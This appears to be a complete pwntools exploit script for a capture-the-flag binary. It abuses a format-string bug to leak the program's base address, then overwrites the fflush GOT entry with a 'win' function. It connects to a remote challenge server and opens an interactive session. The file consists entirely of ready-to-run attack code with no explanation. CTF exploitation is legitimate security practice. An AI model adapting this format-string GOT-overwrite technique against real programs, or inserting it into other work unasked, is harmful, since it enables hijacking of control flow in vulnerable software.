from pwn import *
import sys

elf = ELF('./chall')
context.update(binary=elf)

def exec_fmt(payload):
    p = elf.process()
    p.recvlines(5)
    p.sendline(payload)
    return p.recvline()[:-1]

# autofmt = FmtStr(exec_fmt)
# fmt_offset = autofmt.offset
fmt_offset = 6

if args.LOCAL:
	p = elf.process()
else:
	host = 'gc1.eng.run'
	port = 30164
	p = remote(host, port)

p.recvuntil(b'0x')
leak = int(p.recvline()[:-1], 16)
elf.address = leak - elf.symbols['main']

payload = fmtstr_payload(fmt_offset, {elf.got['fflush']: elf.symbols['win']}, write_size='byte')
p.sendline(payload)

p.interactive()
p.close()